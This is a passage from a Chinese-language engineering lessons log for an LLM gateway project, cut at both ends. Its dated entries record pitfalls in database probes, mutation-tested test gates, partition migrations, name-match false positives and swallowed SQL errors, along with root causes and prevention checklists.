     ★ 本次冲突解决得「干净」（两侧都在），**但文件本身早就被换过一遍了**；
  ③ ★★★ **共享仓库里，过程记录文件是【合并的高危文件】** ——
     ★ 它只增不减 ⇒ ⇒ **它几乎不可能有正当的「大幅缩小」理由**
     ⇒ ⇒ **任何一次合并后它变小，都应视为事故而不是「整理」**；
  ④ ★★★ **别把「提交信息里说保留了」当成证据** —— ★ **要读文件、读数字**。
- 证据：`git log --format='%h %s' -- LESSONS.md` + `git show <rev>:LESSONS.md | wc -c`
  逐提交比对（429,302 → 5,683）；恢复提交 `739d19ddb`（202 条 / 436,947 bytes）；
  门 `scripts/ursmcheck/process_record_guard_test.go`（3 条），变异 M1~M4 全红。
- 溯源：llm-gateway-go4 §143.30 轮后续（2026-10-20）。

## 2026-10-20 §143.32 轮 — 量具在「不适用的形态」上会把「**数不到**」报成「**没有**」（Seen: 1/3）
- 场景：211 上跑着一道基线跨度探针，它数「带日期的分区」⇒ 判「表里有几天基线数据」。
  实测 211 的 `ursm_node_snapshot_min` 是**普通表**（`relkind='r'`）⇒ 探针每轮返回 `0|0|0`
  ⇒ 于是它每轮报「**0 day(s) with data**」+「**基线样本不足 / 本次 OK 判定是偏宽松的**」
  ⇒ ⇒ ★★ **但 211 的表里实测有 7 天数据、5,933,760 行** ⇒ ⇒ ★★★ **那是假告警**。
- 根因（一行）：★ **探针把「我的数法在这个形态上不适用」当成了「事实为零」** ——
  ★ 它的两重依赖（`pg_inherits` 分区目录 + 分区名 `_[0-9]{8}$`）在普通表上**必然**命中 0 行。
  ⇒ ⇒ ★★★ **「数不到」与「没有」是两件事，量具必须能区分它们。**
- 防复发检查：
  ① ⭐⭐⭐⭐⭐ **任何量具/探针都要先问：「我的读法在哪些形态上不适用？」**
     ⇒ ⇒ **不适用时必须输出明确的「不适用」（如 `n/a`）+ 理由，而不是把它折成 0/空**
     ⇒ ⇒ ★★ **判据要配一条「不适用形态」的用例**，不能只测「正常形态」；
  ② ⭐⭐⭐⭐ **判据的「假告警」方向也要钉**：★ **「该报的没报」和「不该报的报了」是两种缺陷**，
     ★ **只钉前者会漏掉后者**（本轮就是「没报」这一侧全绿，而「报了」这一侧是错的）；
  ③ ⭐⭐⭐ **先量事实再下结论**：★ 「0 天」这个读数**必须与表的实际行数/跨度并排看**
     ⇒ ★ **两把尺子不一致时，是尺子错了**（同族：[[量具之间矛盾时先怀疑量具]]）。
- 证据：runbook `§143.32`；211 实测（`relkind='r'`、5,933,760 行、span 10-13→10-20）
  vs 巡检日志每轮 `0 day(s) with data`；修法 P18（探针带 `relkind` + 分区总数，
  不适用时输出 `baseline span: n/a`），行为门 2 条新用例 + 1 条源码断言，变异 M1~M7 全红。
- 溯源：llm-gateway-go4 §143.32 轮（2026-10-20）。

## 2026-10-20 §143.32 轮 — 改夹具/桩时**按「出现次数」改，不要按「第一次命中」改**（Seen: 1/3）
- 场景：给探针加了 2 个输出字段 ⇒ 桩（假 psql）必须多返回 2 段。
  我用 Python 的 `str.replace(needle, repl)` 改桩，**needle 里带了行尾注释** ⇒
  ⇒ ★★ **只命中了两处同形桩中的一处** ⇒ 另一处仍返回 3 段
  ⇒ ⇒ ★★ 于是脚本读到空的 `relkind` ⇒ 走进新分支 ⇒ **「基线真薄要告警」那条既有门当场变红**。
- 根因（一行）：★ **needle 带上下文 ⇒ 它只匹配一处** ⇒ ★★ **「我改了文件 ⇒ 那文件里所有同形的地方都改了」是错的**。
- 防复发检查：
  ① ⭐⭐⭐⭐ **改夹具/桩/夹带文本时，先数出现次数**（`grep -c`）⇒ ★★ **要么用不带上下文的 needle 做 replace_all，
     要么逐处改并核对计数**；
  ② ⭐⭐⭐⭐ **改完必须跑【既有】门** —— ★ 本轮正是既有门 `TestHealthSummaryCarriesBaselineThinSuffix`
     抓到了「只改了一半」⇒ ★★ **既有门不只防回归，也是你这次改动的对照物**；
  ③ ⭐⭐⭐ 同族：[[Contains 型门只保护「至少有一处」]] —— ★ **「只改到一处」与「只替换到第一处」是同一个盲区**
     ⇒ ⇒ ★ **两边都要用「出现次数」来核**。
- 证据：§143.32 轮的实际一次红：`TestHealthSummaryCarriesBaselineThinSuffix`
  （summary 行缺 `baseline_thin=thin:3d/7d`）⇒ 定位到第二处桩未改 ⇒ 补改后全绿。
- 溯源：llm-gateway-go4 §143.32 轮（2026-10-20）。

## 2026-10-20 §143.33 轮 — 「登记为竞争者」不等于「是竞争者」：未量化的推断必须补量化，且**补完可能反向**（Seen: 1/3）

- 场景：§143.31 在现场采样里顺带发现 `stats_ground_truth_gap`（路由健康检查）开 3 个并行 worker，
  于是把它登记成 **P16「CPU 侧竞争者」**，并推断
  「它与 rollup 抢 CPU，而 rollup 与巡检抢 I/O ⇒ 252 的 load 14/4 核 是【多个作业】共同造成的」。
  §143.33 把它量化后：**总 DB 时间 264.2 s / 44.3 h 墙钟（0.17%）**、
  **物理读 230 块/次（≈1.8 MB，全在缓存里）** ⇒ ⇒ **它既不吃 CPU 也不吃 I/O ⇒ P16 降级**。
- 根因（一行）：★ **「现场看到了它开着并行 worker」只能证明它在【跑】，不能证明它在【抢】** ——
  真正决定「抢不抢」的是**它占总资源的多大比例**，而这必须量。
- 防复发检查：
  ① ⭐⭐⭐⭐⭐ **凡是「登记为竞争者/瓶颈」的条目，都必须钉住一个【量化的份额】**
     （占总 DB 时间 % / 物理读块数 / 平均耗时），**不能只钉「它开着并行 worker」**；
  ② ⭐⭐⭐⭐ **「未量化 ⇒ 诚实边界」这类条目，在量化之后要重新裁决方向** ——
     ⇒ **本轮的方向与登记时的预设【相反】** ⇒ ⇒ ★★ **⇒ 「先登记再量化」是允许的，
     但量化后必须回来改结论，而不是把登记当成既定事实**；
  ③ ⭐⭐⭐⭐ **量完后必须回到【因果链】层面复核**：本轮真正作废的不是 P16 这个条目，
     而是「它与 rollup 抢 CPU ⇒ load 是多个作业共同造成的」这条**因果链** ——
     ★ **因为 §143.31 对 rollup 的现场读数是 `IO|DataFileRead`，【不是】CPU 等待**；
  ④ ⭐⭐⭐ **「瓶颈」这个词先问是哪一种**：⇒ **I/O 线**（巡检 74 GB 物理读）
     与 **总 DB 时间/CPU 线**（matview 刷新 6,965 s）是**两条独立的线**，混谈会把优先级排错。
- 证据：runbook `§143.33` + 订正横幅十二/十三/十四（就地钉在 §143.31）；
  生产只读 `pg_stat_statements`（窗口 `stats_reset` = 2026-10-18 22:03:37 → 44.3 h）。
- 溯源：llm-gateway-go4 §143.33 轮（2026-10-20）。

## 2026-10-20 §143.33 轮 — 「禁止【提及】行号」与「禁止【依赖】行号」是两件事；后者才是真守卫（Seen: 1/3）

- 场景：§143.33 发现文档里引用的源码行号会漂移（`bg/routing_health_checks.go` 的
  `stats_ground_truth_gap` 在并行会话提交后从 **947 变成 948**）
  ⇒ 我在门里写了一条「§143.33 不得出现带行号的源码引用」。
  ⇒ 结果**门自己立刻变红** ⇒ 因为 **§143.33 的第 7 条正是「展示这个漂移」⇒ 它必须引用 947 与 948**。
- 根因（一行）：★ **我禁掉的是「提及」，而我要禁的其实是「依赖」** ——
  ⇒ **禁掉提及 = 把证据本身删掉**（那一节存在的理由就是要展示漂移）。
- 防复发检查：
  ① ⭐⭐⭐⭐⭐ **判别动作**：问一句「**这条禁令防的是【引用出现在哪】，还是【判据依赖它】？**」
     ⇒ **前者通常该撤回，后者才是真守卫**；
  ② ⭐⭐⭐⭐ **判据自身依赖行号 ⇒ 别人的并行提交会把门打红 ⇒ 那是【量具坏了】而不是【守卫失效】**
     ⇒ ⇒ ★★ **⇒ 门要钉稳定锚点**（本轮钉 `CheckID` 字符串 + 读数，不钉行号）；
  ③ ⭐⭐⭐⭐ **「文档要展示漂移」与「门不得依赖漂移」必须分开钉**：
     ⇒ 前者钉「947 与 948 都要在」；后者钉「本门的 needle 集合里没有『文件名+行号』形态」；
  ④ ⭐⭐⭐ **★ 自检「门不依赖 X」时，千万别用「扫源码全文」** ——
     ⇒ **检查清单自身、以及解释「为什么禁」的注释，都会含有那个字面量** ⇒ ⇒ **自指 ⇒ 恒红**。
     ⇒ ⇒ ★★★ **⇒ 正确形态：把「本门用到的 needle」显式列成一个集合，逐个判定** ——
     这同时让「门到底钉了什么」有了单一事实源。
- 证据：runbook `§143.33` 第 7 条；门 `scripts/ursmcheck/section_14333_test.go`
  的 `TestRunbook14333DoesNotPinLineNumber` + `section14333Needles()` + `looksLikeFileLineRef()`。
- 溯源：llm-gateway-go4 §143.33 轮（2026-10-20）。

## 2026-10-20 §143.33 轮 — 单点读数要配【复读】，复读本身就是「这条读数稳不稳」的证据（Seen: 1/3）

- 场景：写 §143.33 时，18:0x 读了一次 P16 的 `pg_stat_statements` 成本，
  18:20:57 复读一次 ⇒ `calls` **329 → 331**、`mean` **780.7 → 798.2 ms**、
  `total` **256,837 → 264,220.1 ms**，而 `max`（15,910.5 ms）与
  `shared_blks_read`（**76,147**）**完全不动**。
- 根因（一行）：★ **两次读数之间的差不是「读数不稳定」，而是「这 2 分钟里它又跑了 2 次」** ——
  ⇒ **新增的 2 次调用读了 0 个块** ⇒ ⇒ **进一步印证「它读的数据全在缓存里」**。
- 防复发检查：
  ① ⭐⭐⭐⭐ **写文档前把关键读数【复读一遍】** ⇒ 差值本身就是证据（能区分「漂移」与「又发生了一次」）；
  ② ⭐⭐⭐⭐ **在文档里把两次读数【并排写出来】**，不要只写最后那一个 ——
     ⇒ ★★ **单点读数会被后人当成噪声，两点读数才是稳定性证据**；
  ③ ⭐⭐⭐ **特别注意「不变的那几个量」**（本轮是 `max` 与物理读）⇒
     ⇒ **它们比变化的量更能说明「这不是采样抖动」**；
  ④ ⭐⭐ **窗口必须同时钉住**（本轮 `stats_reset` = 2026-10-18 22:03:37 ⇒ 44.3 h），
     ⇒ 否则「每场多少次」的分母会随读取时刻漂移。
- 证据：runbook `§143.33`「稳定性复读」段；门
  `scripts/ursmcheck/section_14333_test.go` 的 `TestRunbook14333ReadingsAreStable`
  （把复读并排钉住）⇒ 变异 M9~M13 全红。
- 溯源：llm-gateway-go4 §143.33 轮（2026-10-20）。

## 2026-10-20 §143.34 轮 — 判「某台机器没跑这个作业」时，**必须四路并查**；只看 cron 会漏掉最阴的那一种形态（Seen: 1/3）

- 场景：要闭合「154 / 245 上有没有同名巡检（`ursm-snapshot-health.sh`）」这个三处轮次都留着的缺口。
  我先查了 `/etc/cron.d/`（无）与 `crontab -l`（无）⇒ 本来可以直接下结论「没跑」。
  ⇒ ★★ **但我补了第三路 `systemctl list-timers`、第四路「按名字全盘 `find`」**
  ⇒ ⇒ 结果是：**两台上连同名脚本都不存在** ⇒ 这比「cron 里没有」**更强**。
- 根因（一行）：★ **「cron 里没有」只排除了一种形态** ——
  ⇒ **它排除不掉「脚本已部署、只是调度没配」** ⇒ ⇒ ★★ **而那恰恰是最容易让人误判
  「这台没跑」的那一种**（运维看到脚本在，就会以为它在跑；反过来做审计的人看到 cron 空，
  也会以为它彻底不存在）⇒ ⇒ ★★★ **⇒ 两个方向的误判都由这一形态造成**。
- 防复发检查：
  ① ⭐⭐⭐⭐⭐ **判「某主机没跑 X」时，四路并查**：
     ★ ① `/etc/cron.d/` **全量列出**（不要只 grep 关键词 —— 要看到「那里本来有什么」）；
     ★ ② `crontab -l` **全量**（root 的 crontab 常常不在 `/etc/cron.d`）；
     ★ ③ `systemctl list-timers --all`（timer 是第三条路径，只查 cron 会漏）；
     ★ ④ **按名字全盘 `find` 脚本本体**（★ 这一路把「装了没排期」与「压根没有」区分开）。
  ② ⭐⭐⭐⭐ **★ 结论要写成【排他性】的形式并钉住**：「全网只有 252 与 211 两台在跑」
     ⇒ 这类结论很容易在下次有人加装时被无声推翻 ⇒ **要进门**；
  ③ ⭐⭐⭐⭐ **★ 「没跑这个」≠「不需要审计」** ——
     ⇒ 154/245 是**网关主机**（跑网关侧 cron + fail2ban + sing-box），不是这台 PG 的宿主
     ⇒ ⇒ ★★★ **⇒ 排他性结论必须同时写下「那台仍然要按它自己的口径审计」**，
     否则会被读成「这台可以不管了」；
  ④ ⭐⭐⭐ **★ 侦察范围变化时，要检查【旧结论的限定】有没有被动摇** ——
     本节没有改变 252 与 211 的机器差异 ⇒ ⇒ **「252 慢是争用」仍然只是提示不是证明**
     ⇒ ⇒ ★★ **⇒ 排他性结论只排除「第三个变量」，不等于证明了剩下的那个**。
- 证据：runbook `§143.34` + 订正横幅十五（就地钉在 §143.32.6）；
  154 = `0hourly`/`cleanup-known-junk`/`llm-gateway-feishu`/`llm-gateway-prune`/`sysstat`
  + fail2ban/sing-box 6 条；245 = `0hourly`/`cleanup-known-junk`/`raid-check`/`update-motd`
  + crontab 空 ⇒ 两台 systemd timer 空 + 同名脚本不存在。
  门 `scripts/ursmcheck/section_14334_test.go`（新，11 条）⇒ 变异 M1~M33 全红。
- 溯源：llm-gateway-go4 §143.34 轮（2026-10-20）。
## 2026-10-21 — ★★ **oracle 不能用「被测对象自己的产物」**：被测对象坏掉时门会自动闭嘴（Seen: 1/2）
- 场景：给「全新安装的月分区形态」写门 `db/db_fresh_install_partition_shape_test.go`。
  第一版的量具自检是「`llm_gateway_ensure_monthly_partition`（迁移 893 独有的助手函数）在不在？」
  ⇒ 不在就 `t.Skip`（理由：这不是新装库）。
  ⇒ ★ 变异 M1「把 893 从安装链摘掉」⇒ **门是绿的**（0.62s、无 FAIL）——
  ★★ 因为**标记函数随 890 一起消失了** ⇒ oracle 判「这不是新装库」⇒ **SKIP**。
- 根因（一行）：★ **oracle 必须与被测对象无关** —— 用被测对象的产物当 oracle，
  等于让门在「被测对象缺席」时自动闭嘴 ⇒ 恒绿门。
- 防复发检查：
  ① ★★★★★ **oracle 只取「不会随被测对象消失」的东西**：
     仓内约定（`TEST_DATABASE_URL` / `TEST_DB_URL`）、显式 opt-in env、或**别的**迁移的产物；
  ② ★★★★ **被测对象的产物要「降级成断言」而不是「没有它就跳过」**：
     本轮改成「★ 迁移 893 的助手函数必须存在」（在 ⇒ 继续验；在 ⇒ 直接红）；
  ③ ★★★★ **门的第一个变异要选「把被测对象整个拿掉」**（不是「改坏它」）——
     ★ 「改坏它」时产物还在 ⇒ oracle 仍成立 ⇒ 门照样红 ⇒ **看不出 oracle 有问题**；
  ④ ★★★ 配「无副作用」改造：**所有写操作放进会 ROLLBACK 的事务**
     ⇒ 门才敢指向任何库（生产上只是事务往返，不留对象、不留行）⇒ oracle 可以简单。
- 证据：`db/db_fresh_install_partition_shape_test.go` 第一版 vs 第二版；
  变异 M1（摘 890）第一版 SKIP 绿 / 第二版 **36 条断言红**（2 + 33 + 1）。
- 溯源：R62 轮（2026-10-21）。

## 2026-10-21 — ★★ 「存在性」不等于「能工作」：**命名约定**类的错，只有真的调用才看得见（Seen: 1/2）
- 场景：修「全新安装缺当月分区」的新迁移 893，第一版用 `p_parent || '_' || YYYY_MM` 拼子分区名。
  ⇒ 对 `_request_logs` / `_request_logs_bodies` 两族**造错了名字**
  （真约定是 `request_logs_YYYY_MM` —— S4 把父表改名成 `_request_logs`，子分区沿用旧名；
  baseline 与**生产 252** 都是这个约定）。
  ⇒ ★★ 实测后果（不是推理）：baseline 自带的 `ensure_request_logs_partition` 每次都判「不存在」
  ⇒ 重建 ⇒ **边界重叠报错**：
  `ERROR: partition "request_logs_2026_10" would overlap partition "_request_logs_2026_10"` (42P17)
  ⇒ ⇒ **分区在、函数在**，但该族**永远无法自愈**。
- 根因（一行）：★ **「表在不在」是形状断言，「函数造出来的名字对不对」是行为断言** ——
  后者不在前者里 ⇒ 只查存在性的门看不见。
  ① ★★★★★ **对「运行期会被调用的函数」要有一条「逐个真的调用、零报错」的断言** ——
     ★ 这条断言是本轮**唯一**抓到上述缺陷的判据；
  ② ★★★★ **建分区/建对象的迁移里，子对象名要从「既有兄弟」推导，不能拿父名拼**
     —— ★ 父表名 ≠ 子对象命名约定（S4 改名后子分区沿用旧名）；
     ⇒ 本轮正解：按族内既有兄弟名的**众数**推导前缀（`llm_gateway_monthly_family_prefix`）；
  ③ ★★★ **幂等判定要按「边界覆盖」而不是按「名字」** ⇒ 对「名字不对但边界对」的既有分区也幂等；
  ④ ★★ 建完对象后**真的调一次**：分区创建是 DDL，报错会**整段回滚** ⇒ 失败是安全的，
     但**静默**（只有 NOTICE/日志）⇒ 不主动调用就永远看不见。
- 证据：迁移 `sql/migrations/startup/893_fresh_install_partition_prereq.sql` v1 → v2；
  变异 M2（把前缀改回 `p_parent`）⇒ 门**红 2 条**且报错与手工实测**逐字一致**。
## 2026-10-21 — ★★★ 「按名命中」对「**不存在的列**」必然是假阳性 ⇒ severity 的第一道闸门是**生产侧**（Seen: 1/2）
- 场景：缺列登记册里 20 列的 severity 是「按列名在产品代码里检索」判出来的，
  其中 **11 列被判 high/medium** ⇒ 属主据此拍板「补 20 个 ALTER 迁移并登记」。
  ⇒ ★★★ R62 轮拿**生产 252** 把这 20 列逐条核对 ⇒ **16 列生产也没有**
  ⇒ 「没人跑过的死 DDL」（对应迁移的 `CREATE TABLE` 形状在「表已存在」上整段静默空操作
  ⇒ 那段 DDL 从未真正生效过）⇒ **产品走不到那条路径** ⇒ **按名命中全是假阳性**
  （命中的是别名 / 别的表 / 别的 schema）⇒ **11 行 high/medium 全部降级 benign**
  ⇒ ⇒ ★★ **真缺口集 = ∅** ⇒ 「补 20 个 ALTER」**不执行**。
- 根因（一行）：★ **一个列在生产里都不存在，产品就不可能真的依赖它** ——
  「按名命中」量的只是**字符串出现**，不是**这个物理列被读过**。
  ① ★★★★★ **判「缺列是缺陷」必须三侧对照**：**生产有 ∧ 新装没有 ∧ 产品依赖** ——
     ★ 三侧任缺一侧，都会产出一批「看着像缺陷、其实不是」的登记行；
  ② ★★★★ **机械判定的结果只能当参考**；人工覆盖行里要**写明生产侧核对结论**
     （本轮 20 条 OVERRIDE 行都带「生产侧核对（252，2026-10-21）」+ 结论）；
  ③ ★★★ **当机械判定直接驱动了属主决策时 ⇒ 先把它的「前提」量出来** ——
     ★ 本轮若不核对生产侧，就会补出 11 个**没人依赖、连生产都没有**的列；
  ④ ★★ 三类假阳性要分清：**ensure 自愈的列**（口径伪影）/ **生产也没有的死 DDL** /
     **生产多留的历史列** ⇒ 每一类都是「量具口径」问题，不是产品缺陷。
- 证据：`sql/schema/fresh_install_column_gaps.tsv` 的 20 条 `# OVERRIDE` 行（2026-10-21 生产 252 核对）。
## 2026-10-21 — ★★ 副本与 canonical 不同步 ⇒ **测的还是旧的那份**（读数「完全没变」的第一嫌疑）（Seen: 1/2）
- 场景：修好迁移 893（改的是 `sql/migrations/startup/890_*.sql`）后重建一次性库
  ⇒ ★ **读数完全没变**（分区名仍旧是错的那个）⇒ 查因：
  ★ `scripts/audit/probe-onetime-db-shape.sh` 读的是 **`installer/cmd/llm-gw-installer/embeddata/startup/`**
  （installer 真正打包的那份），**不是** `sql/migrations/startup/`。
  ⇒ ⇒ 我改的是 canonical，**测的是副本** ⇒ 白跑一轮。
- 根因（一行）：★ **「6 点同步」里有一条是副本**；只改一处 ⇒ 验的东西与改的东西不是同一份文件。
  ① ★★★★ **改任何有副本的文件之前，先确认「被测/被部署的路径」是哪一个**
     （问一句：这个文件最终是从哪条路径被加载的？）；
  ② ★★★ **副本与 canonical 的 md5 必须相等**（本轮：两者都是 `938a9b617a166d1dcee297f372b22368`）
     ⇒ 可加门把「副本漏同步」钉死；
  ③ ★★★ **「改完读数完全没变」的第一嫌疑 = 「我测的不是我改的那份」** ——
     ★ 与「0 命中的第一嫌疑是量具坏了」同族，但方向相反：一个查**读**，一个查**写**。
- 证据：`scripts/audit/probe-onetime-db-shape.sh` 的 `SF_DIR` 指向 embeddata 目录。
## 2026-10-21 — ★★★ **「链尾的迁移」可能跑在别人的退役之后** ⇒ 看似无害的「补齐」会**复活已退役的东西**（Seen: 1/2）
- 场景：本轮把新迁移登记在 installer 启动链的**链尾**（补当月分区）⇒ 推 origin/main 时
  合并进来一条并行会话的迁移 `890_drop_request_logs_v1_family.sql`：
  它**退役了 v1 request_logs 族** ⇒ 把 `ensure_request_logs_partition` /
  `ensure_request_logs_bodies_partition` **一起 DROP 了**（`DROP FUNCTION IF EXISTS ...`）。
  ⇒ ★★★ **本迁移跑在退役之后** ⇒ 若它还「确保那两个函数存在」，
  **就会把一个已退役的族复活** ⇒ 运行期会重新去调那些函数、重新建那些分区。
- 根因（一行）：★ **「补齐」动作的副作用取决于它在链上的**相对位置** ——
  链尾的迁移看到的是**别人退役之后的世界**，而它的代码是照着**退役之前的世界**写的。
  ① ★★★★ **「不建/不补」类决定要问一句「会不会复活别人退役掉的东西」** ——
     ★ 本轮「893 不建任何函数」这个决定，在合并前只是**省事**（11/11 都在 baseline），
     合并后变成**安全关键属性** ⇒ ★★ **同一个决定的安全性会随链上顺序而变**；
  ② ★★★★ **合并进来别人的「退役/删除」迁移后，要回头核自己的**：迁移、门、清单、
     以及**别的会话的门**（本轮核出 4 处：门的目标函数 11→9、R61 门的自愈清单、
     迁移注释、台账）；
  ③ ★★★ **不要在自己的迁移里「确保」一个你不知道是否已被退役的对象存在** ——
     ★ 更稳的形态是「**只在不存在时创建**」（本轮原本就是），
     但对**已被 DROP 的**对象，「不存在时创建」本身就是复活 ⇒ ⇒ ★
     ⇒ **正确形态是「明确列出本迁移负责的对象」**，而不是「扫到啥补啥」。
- 证据：合并后一次性库实测 `request_logs` / `_request_logs` / `request_logs_hot` /
  `_request_logs_bodies` **全部不存在**；11 个目标 ensure 函数只剩 **9 个**。
- 溯源：R62 轮（2026-10-21）handoff §19.8.9。
## 2026-10-21 — ★★ **变异红 0 条 ≠ 门没牙**：先问「**变异的前提**还在不在」（Seen: 1/2）
- 场景：本轮的门（`db/db_fresh_install_partition_shape_test.go`）用变异 **M2**
  （把子分区前缀改回 `p_parent`）证明「能抓住命名约定类缺陷」⇒ 门红 2 条、报错与手工实测逐字一致。
  ⇒ ★ 合并后（v1 族退役）**同一个变异红 0 条**。
- 根因（一行）：★ **M2 的缺陷只影响 `_request_logs` / `_request_logs_bodies` 两族**
  ⇒ 而那两族**已被退役迁移删掉** ⇒ **缺陷本身变潜伏** ⇒ 变异「不再制造任何可观测差异」
  ⇒ ⇒ ★ **红 0 条的原因是「变异失效了」，不是「门没牙」**。
  ① ★★★★ **每个变异都要先确认「它的前提在当前代码状态下还成立」** ——
     ★ 本轮的前提是「那两个族还在」⇒ 合并后不成立；
  ② ★★★★ **前提漂移后必须补一条「在当前状态下仍可观测」的变异** ——
     ★ 本轮补 **M3**（破坏前缀推导 `v_prefix || '_x'`）⇒ **红 39 条** ⇒ 门确实有牙；
  ③ ★★★ **「变异后门仍绿」的第一反应仍是「量具/变异错了」而不是「门没牙」** ——
     ★ 与「0 命中的第一嫌疑是量具坏了」同族，但这次坏的是**变异**；
  ④ ★★ 保留原变异的**历史读数**并写明「它的前提何时失效」⇒ 不要删掉证据，
     而是**标注它已经不能证明什么**。
- 证据：合并后 M2 红 0 条 / M3 红 39 条；两次还原 md5 逐字一致。
## 2026-10-21 — ★★★ **「按名命中」几乎总是假阳性；「按名零命中」才是可信证据**（Seen: 1/2）
- 场景：给「生产有 ∧ 新装没有」的 **98 条功能表候选**做产品依赖判定 ⇒ 按列/表名在仓内检索，
  **11 条**命中 ⇒ 逐条读代码 ⇒ ★★★ **11 条全是误报**：
  `agent_discovery` 是**管线阶段名**、`consents` 是 **HTTP 路由**（代理到外部服务）、
  `credential_client_quota` 是**设置键**、`documents`/`feedback`/`instances`/`memory`/
  `knowledge`/`plugins`/`projects` 是**通用英文词**（散文 / JSON 键 / 变量名）。
- 根因（一行）：★ **「产品依赖一个表 ⇒ 必然在代码里按名出现」是单向蕴含** ——
  ⇒ **「按名有命中」不能推出「有依赖」**（误报形态极多）
  ⇒ ⇒ **但「按名零命中」可以推出「无依赖」** ⇒ ★★ **零命中才是可信的那一侧**。
  ① ★★★★★ **判依赖时，把「按名命中」当**线索**而不是**证据**；要下结论必须**读那几行代码**；
  ② ★★★★ **命中后必须先排除这几类误报形态**：通用英文词 / 路由路径 / 设置键 / 管线阶段名 /
     JSON 路径 / 测试 fixture 文件名 / SQL 关键字；
  ③ ★★★★ **「零命中 ⇒ 不依赖」的前提是「依赖以字面表名表达」** ⇒ 必须**核一遍动态拼名**
     （本轮核 11 个前缀 ⇒ 0 处）⇒ 前提不成立时，零命中**不能**当证据；
  ④ ★★★ **与「按名命中对不存在的列必然假阳性」是同一条，但更一般** ——
     ★ 那条讲「对象不存在时命中无意义」；这条讲「**对象存在时命中也可能无意义**」。
- 证据：handoff §19.9.4（11 条误报的逐条出处 + 动态拼名核查）。
- 溯源：R63 轮（2026-10-21）。
## 2026-10-21 — ★★ **空结果文件是最危险的读数**：SQL 报错被 `2>/dev/null` 吞掉 ⇒ 空得像「0 条」（Seen: 1/2）
- 场景：查生产与新装库的关系清单做差集 ⇒ 第一版查询
  `nspname||'.'||relname||'|'||relkind` 在 PG 17 报
  `ERROR: operator is not unique: text || "char"` ⇒ ★ 而我**把 `2>/dev/null` 写在同一条命令里**
  ⇒ **报错被吞** ⇒ 输出文件**是空的** ⇒ ★ **空文件与「真的 0 条」在读数上完全一样**
  ⇒ 我差点据此断言「生产里一个关系都没有」。⇒ 加 `::text` cast 后才拿到 **721**。
  ⇒ 同轮第二个量具故障：`while read -r` **静默跳过了无换行的最后一条**（98 条只处理 97），
  而统计口径自相矛盾（`|—` vs `|$`）⇒ 得出「97 + 92 = 189 ≫ 98」的读数
  ⇒ ★ **正是这个自相矛盾把它暴露出来的**。
- 根因（一行）：★ **读数的「空」有三种形态：真的是 0 / 查询炸了 / 管道漏了最后一条** ——
  ★ 而「输出文件」把这三种**压成同一个形状**。
  ① ★★★★★ **读数落成文件时，必须同时断言「非空」与「stderr 为空」** ——
     ★ 命令里带 `2>/dev/null` 时尤其危险 ⇒ ⇒ **要么不吞 stderr，要么把 stderr 单独存下来再断言**；
  ② ★★★★ **逐条分类的读数必须自带「分桶之和 == 输入条数」的断言** ——
     ★ 本轮重写后断言 `25+66+9+9+98 == 207` 成立才继续；
  ③ ★★★ **读数出现「自相矛盾」（加起来超过总数 / 出现不可能的组合）时，先怀疑量具** ——
     ★ 这与「0 命中的第一嫌疑是量具坏了」同族，但更精确：
     **「加起来超过总数」= 一定读重了**；
  ④ ★★ **shell 循环处理文件时，先确认最后一行有换行**（或用 `mapfile` / Python 读），
     ⇒ `while read` 漏尾行是**静默**的。
- 证据：handoff §19.9.1（两次量具故障的原始报错与读数）。
## 2026-10-21 — ★★★★ **「源里出现过某个形态」≠「源错了」**：源可能是**某个时点的快照**（Seen: 1/2）
- 场景：全仓 `go test ./...` 摸底 ⇒ 并行会话的 `TestComposerDefinesNoV1ArmView` 红：
  「全仓推出 5 个含 v1 臂的视图 …… 885 之后**不应该有**」⇒
  那 5 个是 `sql/objects/views/` 里的 `customer_cost_view` / `model_cost_per_task_view` /
  `v_continuation_effectiveness` / `v_node_switch_analysis` / `v_timeout_effectiveness`。
  ⇒ ★★ **按那道门去改源文件 ⇒ 会打挂全新安装**（下面实测）。
- 根因（一行）：★ **那 5 个源文件是「基线形态快照」，不是「部署形态定义」** ——
  ★ 基线 `01-schema.sql` 是**逐语句**应用的，而 `CREATE VIEW` **急切校验**引用的关系
  ⇒ 基线时点 `session_turns_hot` **还不存在** ⇒ ⇒ 源里**只能**写 v1 fallback 体
  ⇒ ⇒ 部署形态由**启动序列的 883/884** 换上 ⇒ ⇒ 两条路径跑完启动序列后形态一致。
- 实测（一次性库，只应用 prereqs + 基线）：
  `public.request_logs` 存在=1、`public.session_turns_hot` 存在=**0**
  ⇒ 在基线时点 `CREATE VIEW ... FROM public.session_turns_hot`
  ⇒ `ERROR: relation "public.session_turns_hot" does not exist`（42P01）。
  ① ★★★★★ **判源之前先问「这个源是哪个时点的形态？它被用在哪一步？」** ——
     ★ 「源里出现过 X」不是缺陷的证据，**「这个源是那个时点的产物吗」才是**；
  ② ★★★★ **判据的「不该有」必须带时点限定** ——
     ★ 「基线时点允许 v1 臂 / 部署时点不允许」是两种不同的判据，不能混用
     ⇒ 否则会要求一个**打挂另一条路径**的改动；
  ③ ★★★★ **一条路径的「不该有」不能套到另一条路径上** ——
     ★ 新装 / 升级、基线 / 部署，各有各的合法形态；
  ④ ★★★ **「看起来是过期快照」时，先找「谁在什么步骤换掉它」** ——
     ★ 本轮找到了 883/884（链索引 280/281）⇒ 链序自洽 ⇒ **实况是对的**；
  ⑤ ★★★ **跨会话共享仓库：发现别人正在做的门红时，先判「是它错还是它对」**
     ⇒ 本轮判为「门的判据前提错」⇒ **发订正 + 给出复跑步骤**，而不是抢地盘改文件
     ⇒ ★ 共享仓库纪律：**同一文件不要两个写者**。
- 证据：handoff §19.10（实测链 + 订正内容）；已向并行会话
  `mvs_36fa7c0b7ea340b1bb611e684eea950c` 发出订正（消息入队）。
- 溯源：R64 轮（2026-10-21）。
## 2026-10-21 — ★★★★★ **「测试没结束」≠「测试慢」：先查「夹具失配 × 产品的重试路径」（llm-gateway-go R65）**
- 场景：`domains/session/v2` 整包 **606.375s** 且 FAIL。已完成的测试里**最慢 0.28s**
  ⇒ 606 秒不在任何测试的「慢」里；唯一**没结束**的那个
  （`TestSessionRequestStatusBackfill_GaugeSampledBeforeFirstDrain`）**永远不会结束**。
- 根因（一行）：★ **夹具钉死了 SQL 文本 ⇒ 失配 ⇒ pgxmock 不消费该期望 ⇒ 它卡在队列头
  ⇒ 后续每次调用都 `was not expected` ⇒ 探针永久失败 ⇒ `run()` 的退避重试永不返回
  ⇒ 测试传 `context.Background()` ⇒ 唯一出口是 `go test` 的 600s 默认超时。**
- ⇒ ⇒ ★ **通用式**：
  1. ⭐⭐⭐⭐⭐ **定位「谁没结束」而不是「谁最慢」** ——
